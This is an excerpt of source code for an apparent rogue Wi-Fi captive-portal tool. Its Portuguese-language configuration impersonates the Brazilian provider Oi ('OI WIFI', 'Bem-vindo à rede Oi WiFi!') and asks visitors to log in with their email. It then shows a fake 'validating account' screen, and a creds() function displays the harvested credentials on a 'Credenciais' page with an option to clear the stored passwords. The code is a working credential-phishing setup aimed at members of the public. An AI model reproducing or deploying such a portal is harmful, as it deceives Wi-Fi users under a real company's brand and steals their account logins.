...
// User configuration
#define SSID_NAME "OI WIFI"
#define SUBTITLE "OI - Free WiFi Service."
#define TITLE "Bem-vindo à rede Oi WiFi!"
#define BODY "Para utilizar a rede Oi WiFi com mais praticidade,rapidez e comodidade, conecte-se através do seu Email!"
#define POST_TITLE "Validando conta..."
#define POST_BODY "Sua conta está sendo validada. Aguarde até 1 minuto pela conexão do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Desmarcado"
...
String header(String t) {
  ...
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               ...
               "nav { background: rgb(242,61,109); color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
...
String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:green\" href=/>Back to Index</a></p><p><a style=\"color:green\" href=/clear>Clear passwords</a></p></center>" + footer();
}
